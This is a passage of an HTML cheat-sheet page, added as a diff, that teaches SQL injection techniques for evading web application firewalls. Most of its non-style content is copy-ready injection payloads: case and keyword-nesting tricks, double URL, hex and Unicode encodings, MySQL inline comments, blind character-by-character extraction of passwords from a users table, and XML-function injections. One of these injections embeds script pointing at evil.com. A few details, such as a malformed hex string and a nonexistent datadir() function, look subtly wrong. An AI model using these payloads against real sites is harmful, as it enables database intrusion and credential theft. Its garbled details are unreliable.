@@ -1,0 +1,1521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SQLi Bypass Techniques – WAF Evasion</title>
+    <style>
+        /* ─────────────────────────────────────────────
+           RESET & BASE
+        ───────────────────────────────────────────── */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #111827;
+            --bg-card: #1a2234;
+            --bg-code: #0d1117;
+            --border-color: #2a3a5a;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --accent-blue: #60a5fa;
+            --accent-purple: #a78bfa;
+            --accent-green: #34d399;
+            --accent-orange: #fb923c;
+            --accent-red: #f87171;
+            --accent-pink: #f472b6;
+            --shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+            --radius: 12px;
+            --radius-sm: 6px;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        /* ─────────────────────────────────────────────
+           SCROLLBAR
+        ───────────────────────────────────────────── */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-blue);
+        }
+
+        /* ─────────────────────────────────────────────
+           CONTAINER
+        ───────────────────────────────────────────── */
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px 24px 60px;
+        }
+
+        /* ─────────────────────────────────────────────
+           HEADER
+        ───────────────────────────────────────────── */
+        .header {
+            text-align: center;
+            padding: 40px 0 32px;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 32px;
+        }
+
+        .header-badge {
+            display: inline-block;
+            background: rgba(96, 165, 250, 0.12);
+            color: var(--accent-blue);
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            border: 1px solid rgba(96, 165, 250, 0.2);
+            margin-bottom: 12px;
+        }
+
+        .header h1 {
+            font-size: 38px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--accent-blue), var(--accent-purple), var(--accent-pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 200% 200%;
+            animation: shimmer 4s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .header .subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            margin-top: 8px;
+            -webkit-text-fill-color: var(--text-secondary);
+        }
+
+        .header .meta {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            margin-top: 16px;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .header .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* ─────────────────────────────────────────────
+           TOC
+        ───────────────────────────────────────────── */
+        .toc {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
+            padding: 24px 28px;
+            margin-bottom: 32px;
+        }
+
+        .toc-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--accent-blue);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 6px 24px;
+        }
+
+        .toc-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 4px 0;
+            font-size: 14px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: 0.3s;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-family: inherit;
+            text-align: left;
+            width: 100%;
+        }
+
+        .toc-item:hover {
+            color: var(--accent-blue);
+        }
+
+        .toc-item .num {
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 600;
+            min-width: 28px;
+        }
+
+        .toc-item .badge {
+            font-size: 10px;
+            padding: 1px 10px;
+            border-radius: 12px;
+            font-weight: 600;
+            margin-left: auto;
+            flex-shrink: 0;
+        }
+
+        .badge.basic {
+            background: rgba(52, 211, 153, 0.15);
+            color: var(--accent-green);
+        }
+        .badge.advanced {
+            background: rgba(251, 146, 60, 0.15);
+            color: var(--accent-orange);
+        }
+        .badge.expert {
+            background: rgba(248, 113, 113, 0.15);
+            color: var(--accent-red);
+        }
+
+        /* ─────────────────────────────────────────────
+           SECTION
+        ───────────────────────────────────────────── */
+        .section {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
+            padding: 28px 32px;
+            margin-bottom: 24px;
+            transition: border-color 0.3s;
+        }
+
+        .section:hover {
+            border-color: rgba(96, 165, 250, 0.2);
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .section-header .icon {
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+
+        .section-header h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .section-header .toggle {
+            margin-left: auto;
+            font-size: 14px;
+            color: var(--text-muted);
+            transition: 0.3s;
+        }
+
+        .section-header .toggle.collapsed {
+            transform: rotate(-90deg);
+        }
+
+        .section-body {
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+        }
+
+        .section-body.collapsed {
+            max-height: 0 !important;
+            padding-top: 0;
+        }
+
+        .section-body.open {
+            max-height: 9999px;
+        }
+
+        /* ─────────────────────────────────────────────
+           CONTENT
+        ───────────────────────────────────────────── */
+        .section p {
+            color: var(--text-secondary);
+            margin-bottom: 14px;
+            font-size: 15px;
+        }
+
+        .section ul,
+        .section ol {
+            color: var(--text-secondary);
+            padding-left: 24px;
+            margin-bottom: 14px;
+            font-size: 15px;
+        }
+
+        .section li {
+            margin-bottom: 4px;
+        }
+
+        .section strong {
+            color: var(--text-primary);
+        }
+
+        .highlight-box {
+            background: rgba(96, 165, 250, 0.06);
+            border-left: 3px solid var(--accent-blue);
+            padding: 12px 18px;
+            border-radius: var(--radius-sm);
+            margin: 12px 0 16px;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        .highlight-box strong {
+            color: var(--accent-blue);
+        }
+
+        .highlight-box.warning {
+            border-left-color: var(--accent-orange);
+            background: rgba(251, 146, 60, 0.06);
+        }
+
+        .highlight-box.warning strong {
+            color: var(--accent-orange);
+        }
+
+        .highlight-box.success {
+            border-left-color: var(--accent-green);
+            background: rgba(52, 211, 153, 0.06);
+        }
+
+        .highlight-box.success strong {
+            color: var(--accent-green);
+        }
+
+        /* ─────────────────────────────────────────────
+           CODE BLOCKS
+        ───────────────────────────────────────────── */
+        .code-block {
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 16px 20px;
+            margin: 12px 0 16px;
+            overflow-x: auto;
+            font-family: 'Fira Code', 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.8;
+            color: var(--text-secondary);
+            position: relative;
+        }
+
+        .code-block .copy-btn {
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: none;
+            color: var(--text-muted);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: 0.3s;
+        }
+
+        .code-block .copy-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-primary);
+        }
+
+        .code-block .copy-btn.copied {
+            color: var(--accent-green);
+            background: rgba(52, 211, 153, 0.1);
+        }
+
+        .code-block .hl-keyword {
+            color: var(--accent-purple);
+        }
+        .code-block .hl-string {
+            color: var(--accent-green);
+        }
+        .code-block .hl-comment {
+            color: var(--text-muted);
+            font-style: italic;
+        }
+        .code-block .hl-function {
+            color: var(--accent-blue);
+        }
+        .code-block .hl-number {
+            color: var(--accent-orange);
+        }
+        .code-block .hl-operator {
+            color: var(--accent-pink);
+        }
+        .code-block .hl-variable {
+            color: var(--accent-red);
+        }
+
+        /* ─────────────────────────────────────────────
+           TABLES
+        ───────────────────────────────────────────── */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 12px 0 16px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+
+        table thead {
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        table th {
+            padding: 10px 14px;
+            text-align: left;
+            font-weight: 600;
+            color: var(--text-secondary);
+            border-bottom: 2px solid var(--border-color);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        table td {
+            padding: 10px 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-secondary);
+        }
+
+        table tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        table .highlight-cell {
+            color: var(--accent-blue);
+            font-weight: 500;
+        }
+
+        /* ─────────────────────────────────────────────
+           GRID CARDS
+        ───────────────────────────────────────────── */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 12px 0 16px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 16px;
+            margin: 12px 0 16px;
+        }
+
+        .grid-card {
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 16px 18px;
+            transition: 0.3s;
+        }
+
+        .grid-card:hover {
+            border-color: rgba(96, 165, 250, 0.2);
+        }
+
+        .grid-card .label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .grid-card .value {
+            font-size: 14px;
+            color: var(--text-primary);
+            font-weight: 500;
+            margin-top: 2px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .grid-card .value.small {
+            font-size: 12px;
+        }
+
+        /* ─────────────────────────────────────────────
+           TAG / BADGE
+        ───────────────────────────────────────────── */
+        .tag {
+            display: inline-block;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .tag.blue {
+            background: rgba(96, 165, 250, 0.12);
+            color: var(--accent-blue);
+        }
+        .tag.green {
+            background: rgba(52, 211, 153, 0.12);
+            color: var(--accent-green);
+        }
+        .tag.orange {
+            background: rgba(251, 146, 60, 0.12);
+            color: var(--accent-orange);
+        }
+        .tag.red {
+            background: rgba(248, 113, 113, 0.12);
+            color: var(--accent-red);
+        }
+        .tag.purple {
+            background: rgba(167, 139, 250, 0.12);
+            color: var(--accent-purple);
+        }
+
+        /* ─────────────────────────────────────────────
+           RESPONSIVE
+        ───────────────────────────────────────────── */
+        @media (max-width: 768px) {
+            .container {
+                padding: 12px 14px 40px;
+            }
+
+            .header h1 {
+                font-size: 26px;
+            }
+
+            .header .subtitle {
+                font-size: 14px;
+            }
+
+            .section {
+                padding: 18px 16px;
+            }
+
+            .section-header h2 {
+                font-size: 18px;
+            }
+
+            .grid-2,
+            .grid-3 {
+                grid-template-columns: 1fr;
+            }
+
+            .toc-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .code-block {
+                font-size: 12px;
+                padding: 12px 14px;
+            }
+
+            .toc {
+                padding: 16px;
+            }
+
+            .header .meta {
+                gap: 12px;
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 20px;
+            }
+
+            .section-header h2 {
+                font-size: 16px;
+            }
+
+            .section {
+                padding: 14px 12px;
+            }
+
+            table {
+                font-size: 12px;
+            }
+
+            table th,
+            table td {
+                padding: 6px 10px;
+            }
+        }
+
+        /* ─────────────────────────────────────────────
+           FOOTER
+        ───────────────────────────────────────────── */
+        .footer {
+            text-align: center;
+            padding: 32px 0 16px;
+            border-top: 1px solid var(--border-color);
+            margin-top: 32px;
+            color: var(--text-muted);
+            font-size: 13px;
+        }
+
+        .footer a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* ─────────────────────────────────────────────
+           BACK TO TOP
+        ───────────────────────────────────────────── */
+        .back-to-top {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.3s;
+            opacity: 0;
+            pointer-events: none;
+            box-shadow: var(--shadow);
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .back-to-top:hover {
+            background: var(--border-color);
+            color: var(--text-primary);
+            transform: translateY(-2px);
+        }
+
+        /* ─────────────────────────────────────────────
+           SEARCH
+        ───────────────────────────────────────────── */
+        .search-box {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .search-box input {
+            flex: 1;
+            padding: 10px 16px;
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .search-box input:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1);
+        }
+
+        .search-box input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .search-box .clear-btn {
+            padding: 10px 16px;
+            background: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-muted);
+            cursor: pointer;
+            font-family: inherit;
+            transition: 0.3s;
+            display: none;
+        }
+
+        .search-box .clear-btn.visible {
+            display: block;
+        }
+
+        .search-box .clear-btn:hover {
+            background: var(--border-color);
+            color: var(--text-primary);
+        }
+
+        .highlight-match {
+            background: rgba(251, 146, 60, 0.25);
+            padding: 0 2px;
+            border-radius: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ── HEADER ── -->
+        <header class="header">
+            <div class="header-badge">⚡ SQL Injection Masterclass</div>
+            <h1>SQLi Bypass Techniques<br />WAF Evasion</h1>
+            <p class="subtitle">9 Core Methods – From Basic to Advanced</p>
+            <div class="meta">
+                <span>📄 0x1 – Common WAF Features</span>
+                <span>🔓 0x2 – Bypass Techniques Overview</span>
+                <span>🛡️ 9 Methods</span>
+            </div>
+        </header>
+
+        <!-- ── SEARCH ── -->
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Search techniques, keywords, payloads..." />
+            <button class="clear-btn" id="clearSearch">✕ Clear</button>
+        </div>
+
+        <!-- ── TOC ── -->
+        <nav class="toc" id="toc">
+            <div class="toc-title">📑 Table of Contents</div>
+            <div class="toc-grid">
+                <button class="toc-item" data-target="section-0x1">
+                    <span class="num">0x1</span> Common WAF Features
+                    <span class="badge basic">Foundation</span>
+                </button>
+                <button class="toc-item" data-target="section-0x2">
+                    <span class="num">0x2</span> Bypass Overview
+                    <span class="badge basic">Foundation</span>
+                </button>
+                <button class="toc-item" data-target="section-case">
+                    <span class="num">a</span> Case Toggling
+                    <span class="badge basic">Basic</span>
+                </button>
+                <button class="toc-item" data-target="section-replace">
+                    <span class="num">b</span> Keyword Replacement
+                    <span class="badge basic">Basic</span>
+                </button>
+                <button class="toc-item" data-target="section-encoding">
+                    <span class="num">c</span> Encoding
+                    <span class="badge advanced">Advanced</span>
+                </button>
+                <button class="toc-item" data-target="section-comments">
+                    <span class="num">d</span> Comments
+                    <span class="badge basic">Basic</span>
+                </button>
+                <button class="toc-item" data-target="section-functions">
+                    <span class="num">e</span> Equivalent Functions
+                    <span class="badge advanced">Advanced</span>
+                </button>
+                <button class="toc-item" data-target="section-symbols">
+                    <span class="num">f</span> Special Symbols
+                    <span class="badge advanced">Advanced</span>
+                </button>
+                <button class="toc-item" data-target="section-params">
+                    <span class="num">g</span> HTTP Parameter Control
+                    <span class="badge expert">Expert</span>
+                </button>
+                <button class="toc-item" data-target="section-buffer">
+                    <span class="num">h</span> Buffer Overflow
+                    <span class="badge expert">Expert</span>
+                </button>
+                <button class="toc-item" data-target="section-integrated">
+                    <span class="num">i</span> Integrated Bypass
+                    <span class="badge expert">Expert</span>
+                </button>
+            </div>
+        </nav>
+
+        <!-- ════════════════════════════════════════════
+        SECTION 0x1 – Common WAF Features
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-0x1">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🛡️</span>
+                <h2>0x1 – Common WAF Features</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Understanding the underlying mechanisms of a <strong>WAF</strong> is crucial for developing effective evasion strategies.
+                    WAFs operate within <strong>four core functional domains</strong>:
+                </p>
+
+                <ul>
+                    <li><strong>Audit Device:</strong> Intercepts HTTP data or specific traffic matching defined rules.</li>
+                    <li><strong>Access Control:</strong> Manages access to web applications through active/passive modes.</li>
+                    <li><strong>Architecture/Network Design Tool:</strong> Reverse proxy for distribution, central control, and virtualization.</li>
+                    <li><strong>Web Application Hardening:</strong> Shields inherent weaknesses and protects against programming errors.</li>
+                </ul>
+
+                <div class="highlight-box">
+                    <strong>🔍 Common Detection Mechanisms:</strong>
+                    <ul style="margin-top:6px;padding-left:20px;">
+                        <li><strong>Anomaly Detection:</strong> Rejects non‑standard HTTP requests.</li>
+                        <li><strong>Enhanced Input Validation:</strong> Server‑side + proxy validation.</li>
+                        <li><strong>Whitelist &amp; Blacklist:</strong> Whitelists for stable apps; blacklists for known attacks.</li>
+                        <li><strong>Rule‑based &amp; Exception‑based:</strong> Rules rely on blacklists; exceptions offer flexibility.</li>
+                        <li><strong>State Management:</strong> Protects session integrity.</li>
+                        <li><strong>Additional:</strong> Cookie protection, anti‑evasion, response monitoring, info leak prevention.</li>
+                    </ul>
+                </div>
+
+                <div class="highlight-box warning">
+                    <strong>🔎 Scanner Identification Traits:</strong>
+                    <ul style="margin-top:6px;padding-left:20px;">
+                        <li><strong>Fingerprinting:</strong> Headers/params (e.g., Acunetix in WVS).</li>
+                        <li><strong>Threshold Triggering:</strong> Excessive rule hits from a single IP/cookie.</li>
+                        <li><strong>Hidden Tags:</strong> Presence of specific link tags.</li>
+                        <li><strong>CAPTCHA:</strong> Scanners cannot solve them automatically.</li>
+                        <li><strong>404 Ratio:</strong> High 404 rate indicates dictionary scanning.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION 0x2 – Bypass Techniques Overview
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-0x2">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">⚡</span>
+                <h2>0x2 – Bypass Techniques Overview</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p><strong>9 Core Methods – from basic to advanced:</strong></p>
+                <div class="grid-2">
+                    <div class="grid-card"><span class="label">a) Case Toggling</span><span class="value">Basic</span></div>
+                    <div class="grid-card"><span class="label">b) Keyword Replacement</span><span class="value">Basic</span></div>
+                    <div class="grid-card"><span class="label">c) Encoding</span><span class="value">Advanced</span></div>
+                    <div class="grid-card"><span class="label">d) Comments</span><span class="value">Basic</span></div>
+                    <div class="grid-card"><span class="label">e) Equivalent Functions</span><span class="value">Advanced</span></div>
+                    <div class="grid-card"><span class="label">f) Special Symbols</span><span class="value">Advanced</span></div>
+                    <div class="grid-card"><span class="label">g) HTTP Parameter Control</span><span class="value">Expert</span></div>
+                    <div class="grid-card"><span class="label">h) Buffer Overflow</span><span class="value">Expert</span></div>
+                    <div class="grid-card"><span class="label">i) Integrated Bypass</span><span class="value">Expert</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION a – Case Toggling
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-case">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🔤</span>
+                <h2>a) Case Toggling</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Targets <strong>case‑sensitive</strong> filters (no <code>/i</code> regex flag).
+                    Mix upper/lower case to evade detection.
+                </p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>z.com/index.php?page_id=15uNloN sEleCT 1,2,3,4</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION b – Replacing Keywords
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-replace">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🔄</span>
+                <h2>b) Replacing Keywords</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    When a <strong>single‑pass</strong> keyword removal is performed, nested keywords reconstruct the original payload.
+                </p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>z.com/index.php?page_id=15UNlunionONSELselectECT 1,2,3,4</code>
+                </div>
+
+                <p>Variants like <code>SeLSeSelecteCTecT</code> are possible but less reliable.</p>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION c – Encoding
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-encoding">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🔐</span>
+                <h2>c) Using Encoding</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">1. URL Encoding</h3>
+                <p>Double encoding bypasses single‑decoding WAFs.</p>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>page.php?id=1%252f%252a*/UNION%252f%252a/SELECT</code>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">2. Hexadecimal Encoding</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>z.com/index.php?page_id=15/1u%6eion//1se%6cet/1,2,3,4</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>SELECT extractvalue(0x3c613e61646d0696e3c2F613E, 0x2f61)</code>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">3. Unicode Encoding</h3>
+                <p>Leverage UTF‑8 and non‑standard encodings to confuse filters.</p>
+
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Character</th>
+                                <th>Unicode Variants</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>'</code></td>
+                                <td><code>%u0027, %u02b9, %u02bc, %u2032, %uff07, %c0%27, %e0%80%a7</code></td>
+                            </tr>
+                            <tr>
+                                <td><code> </code></td>
+                                <td><code>%u0020, %uff00, %c0%20, %c0%a0, %e0%80%a0</code></td>
+                            </tr>
+                            <tr>
+                                <td><code>(</code></td>
+                                <td><code>%u0028, %uff08, %c0%28, %c0%a8, %e0%80%a8</code></td>
+                            </tr>
+                            <tr>
+                                <td><code>)</code></td>
+                                <td><code>%u0029, %uff09, %c0%29, %c0%a9, %e0%80%a9</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>💡 Double‑byte bypass for escaping:</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>?id=10%D6%20AND%201=2%23</code>
+                    </div>
+                    <strong style="margin-top:8px;display:block;">Compare different encodings to alter truth values:</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>SELECT 'A' = 'A';</code>
+                    </div>
+                </div>
+
+                <p>
+                    <strong>UTF‑7, UTF‑16, UTF‑32</strong> have also been used against major targets.
+                </p>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION d – Comments
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-comments">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">💬</span>
+                <h2>d) Using Comments</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Common comment tokens: <code>//, --, /* */, #, -- +, -- -, -- *, -- a</code>
+                </p>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">1. Normal Comments</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>z.com/index.php?page_id=15%55nION/* */%53ElecT 1,2,3,4</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>`union%a0select pass from users#</code>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">2. Inline Comments (MySQL specific)</h3>
+                <p>The <code>/*! ... */</code> syntax is executed only by MySQL.</p>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>index.php?page_id=15/*!UNION*//*!SELECT*/1,2,3</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>?page_id=null%0A/*!150000%55nIOn*//*!%53eLEct*/%0A+1,2,3,4</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION e – Equivalent Functions
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-functions">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">⚙️</span>
+                <h2>e) Equivalent Functions &amp; Commands</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    When specific functions are blacklisted, use these <strong>semantic equivalents</strong>:
+                </p>
+
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Filtered</th>
+                                <th>Alternative</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td><code>hex(), bin()</code></td><td><code>ascii()</code></td></tr>
+                            <tr><td><code>sleep()</code></td><td><code>benchmark()</code></td></tr>
+                            <tr><td><code>concat_ws()</code></td><td><code>group_concat()</code></td></tr>
+                            <tr><td><code>mid(), substr()</code></td><td><code>substring()</code></td></tr>
+                            <tr><td><code>@@user</code></td><td><code>user()</code></td></tr>
+                            <tr><td><code>@@datadir</code></td><td><code>datadir()</code></td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="highlight-box">
+                    <strong>💡 Bypass substr() restriction:</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</code>
+                    </div>
+                    <strong style="margin-top:8px;display:block;">Alternative using strcmp + left:</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>strcmp(left('password',1), 0x69) = 1<br />
+                        strcmp(left('password',1), 0x70) = 0<br />
+                        strcmp(left('password',1), 0x71) = -1</code>
+                    </div>
+                </div>
+
+                <h3 style="color:var(--accent-blue);font-size:16px;margin:12px 0 8px;">Symbol Equivalents:</h3>
+                <ul>
+                    <li><code>AND/OR</code> → <code>&amp;&amp; / ||</code></li>
+                    <li><code>=</code> → <code>&lt; / &gt;</code> (if not less and not greater, it's equal)</li>
+                    <li><code>Spaces</code> → <code>%20, %09, %0a, %0b, %0c, %0d, %a0, /* */</code></li>
+                </ul>
+
+                <div class="highlight-box warning">
+                    <strong>⚡ Exotic Functions (MySQL / PostgreSQL):</strong>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>-- MySQL XML functions<br />
+                        SELECT UpdateXML('&lt;/script&gt;&lt;script/@x/&gt;src=/evil.com', '/', '');<br />
+                        ?id=1 and 1=(updatexml(1, concat(0x3a, (select user())), 1))</code>
+                    </div>
+                    <div class="code-block" style="margin-top:8px;">
+                        <code>-- PostgreSQL<br />
+                        SELECT xmlelement(name img, xmlattributes(1 as src, 'a\x65rt(1)' as "onerror"));</code>
+                    </div>
+                    <p style="margin-top:8px;">
+                        Blacklists rarely cover all DB‑specific functions – a <strong>powerful vector</strong>.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════
+        SECTION f – Special Symbols
+        ════════════════════════════════════════════ -->
+        <section class="section" id="section-symbols">
+            <div class="section-header" onclick="toggleSection(this)">
+                <span class="icon">🔣</span>
+                <h2>f) Special Symbols</h2>
+                <span class="toggle">▼</span>
+            </div>
+            <div class="section-body open">
+                <p>
+                    Non‑alphanumeric symbols carry special meaning in SQL – use them to <strong>bypass spaces and keyword filters</strong>.
+                </p>
+
+                <div class="highlight-box">
+                    <strong>Key Symbols:</strong>
+                    <code>~ ! @ % ( ) [ ] .. + | %00 ` .</code>
+                </div>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>-- Backtick bypasses spaces<br />
+                    select `version`();</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <code>-- Plus sign for concatenation and space avoidance<br />
+                    select+id-1+1.from users;</code>
+                </div>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
